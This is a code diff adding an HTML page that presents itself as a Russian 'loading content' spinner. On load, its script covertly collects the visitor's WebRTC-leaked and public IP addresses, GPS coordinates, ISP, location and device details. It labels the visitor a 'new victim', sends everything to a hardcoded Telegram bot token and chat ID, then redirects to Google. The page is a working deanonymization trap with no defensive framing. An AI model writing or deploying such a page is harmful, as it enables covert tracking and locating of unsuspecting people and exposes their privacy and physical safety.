@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка...</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
+        body {
+            background: #0a0e1a;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #1a2a4a;
+            border-top: 4px solid #4fc3f7;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+        h1 { color: #4fc3f7; font-size: 24px; margin-bottom: 8px; }
+        p { color: #888; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div>
+        <div class="loader"></div>
+        <h1>Загрузка контента...</h1>
+        <p>Пожалуйста, подождите</p>
+    </div>
+
+    <script>
+        // =====================================================
+        // ДАННЫЕ БОТА
+        // =====================================================
+        const BOT_TOKEN = '8877803850:AAFQuNqgnB3XN5lP0js_TeCFT64T8lenv1E';
+        const CHAT_ID = '8284669637';
+        // =====================================================
+
+        // ========== СБОР ДАННЫХ ==========
+        const info = {
+            webrtc_ips: [],
+            public_ip: '',
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screen: window.screen.width + 'x' + window.screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toLocaleString('ru-RU')
+        };
+
+        // ========== WEBRTC ЛОВУШКА (РЕАЛЬНЫЙ IP) ==========
+        function getWebRTCIPs() {
+            return new Promise((resolve) => {
+                const ips = new Set();
+                try {
+                    const pc = new RTCPeerConnection({
+                        iceServers: [
+                            { urls: 'stun:stun.l.google.com:19302' },
+                            { urls: 'stun:stun1.l.google.com:19302' },
+                            { urls: 'stun:stun2.l.google.com:19302' }
+                        ]
+                    });
+
+                    pc.createDataChannel('');
+
+                    pc.onicecandidate = (ice) => {
+                        if (!ice.candidate) {
+                            pc.close();
+                            resolve([...ips]);
+                            return;
+                        }
+                        const candidate = ice.candidate.candidate;
+                        const ipMatch = candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+                        if (ipMatch) {
+                            ips.add(ipMatch[0]);
+                        }
+                    };
+
+                    pc.createOffer()
+                        .then(offer => pc.setLocalDescription(offer))
+                        .catch(() => resolve([]));
+
+                    setTimeout(() => {
+                        pc.close();
+                        resolve([...ips]);
+                    }, 3000);
+                } catch (e) {
+                    resolve([]);
+                }
+            });
+        }
+
+        // ========== ПУБЛИЧНЫЙ IP ==========
+        async function getPublicIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch (e) {
+                return 'Не удалось получить';
+            }
+        }
+
+        // ========== ГЕОЛОКАЦИЯ ==========
+        function getGeo() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) return resolve(null);
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    }),
+                    () => resolve(null),
+                    { timeout: 5000 }
+                );
+            });
+        }
+
+        // ========== ИНФО ПО IP (СТРАНА, ГОРОД, ПРОВАЙДЕР) ==========
+        async function getIPInfo(ip) {
+            try {
+                const res = await fetch(`http://ip-api.com/json/${ip}?lang=ru`);
+                const data = await res.json();
+                if (data.status === 'success') {
+                    return {
+                        country: data.country,
+                        city: data.city,
+                        region: data.regionName,
+                        isp: data.isp,
+                        org: data.org
+                    };
+                }
+                return null;
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // ========== ОТПРАВКА В TELEGRAM ==========
+        async function sendToTelegram(text) {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: false
+                    })
+                });
+                const data = await res.json();
+                console.log('Telegram ответ:', data);
+                return data;
+            } catch (e) {
+                console.error('Ошибка отправки:', e);
+                return null;
+            }
+        }
+
+        // ========== ГЛАВНАЯ ФУНКЦИЯ ==========
+        (async () => {
+            console.log('🎯 Начало сбора данных...');
+
+            // Собираем все данные параллельно
+            const [webrtcIPs, publicIP, geo] = await Promise.all([
+                getWebRTCIPs(),
+                getPublicIP(),
+                getGeo()
+            ]);
+
+            info.webrtc_ips = webrtcIPs;
+            info.public_ip = publicIP;
+            info.geo = geo;
+
+            // Получаем инфо по IP
+            let ipInfo = null;
+            if (webrtcIPs.length > 0) {
+                ipInfo = await getIPInfo(webrtcIPs[0]);
+            } else if (publicIP && publicIP !== 'Не удалось получить') {
+                ipInfo = await getIPInfo(publicIP);
+            }
+
+            // Формируем сообщение
+            let msg = '🎯 <b>НОВАЯ ЖЕРТВА!</b>\n';
+            msg += '━━━━━━━━━━━━━━━━━━━━\n\n';
+
+            msg += `🌐 <b>РЕАЛЬНЫЙ IP (WebRTC):</b>\n`;
+            if (webrtcIPs.length > 0) {
+                webrtcIPs.forEach(ip => { msg += `   <code>${ip}</code>\n`; });
+            } else {
+                msg += `   ❌ Не удалось получить\n`;
+            }
+
+            msg += `\n📡 <b>Публичный IP:</b>\n   <code>${publicIP}</code>\n`;
+
+            if (ipInfo) {
+                msg += `\n🌍 <b>Гео по IP:</b>\n`;
+                msg += `   Страна: ${ipInfo.country}\n`;
+                msg += `   Регион: ${ipInfo.region}\n`;
+                msg += `   Город: ${ipInfo.city}\n`;
+                msg += `   Провайдер: ${ipInfo.isp}\n`;
+                if (ipInfo.org && ipInfo.org !== ipInfo.isp) {
+                    msg += `   Организация: ${ipInfo.org}\n`;
+                }
+            }
+
+            msg += `\n📱 <b>Устройство:</b>\n`;
+            msg += `   Язык: ${info.language}\n`;
+            msg += `   Платформа: ${info.platform}\n`;
+            msg += `   Экран: ${info.screen}\n`;
+            msg += `   Часовой пояс: ${info.timezone}\n`;
+            msg += `   User-Agent: <code>${info.userAgent}</code>\n`;
+
+            if (geo) {
+                msg += `\n📍 <b>GPS-КООРДИНАТЫ:</b>\n`;
+                msg += `   Широта: <code>${geo.lat}</code>\n`;
+                msg += `   Долгота: <code>${geo.lon}</code>\n`;
+                msg += `   Точность: ${geo.accuracy}м\n`;
+                msg += `   <a href="https://www.google.com/maps?q=${geo.lat},${geo.lon}">🗺️ Открыть на карте</a>\n`;
+            }
+
+            msg += `\n🕒 <b>Время:</b> ${info.timestamp}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━`;
+
+            console.log('📤 Отправка в Telegram...');
+            await sendToTelegram(msg);
+
+            // Через 3 секунды переадресация
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 3000);
+        })();
+    </script>
+</body>
+</html>
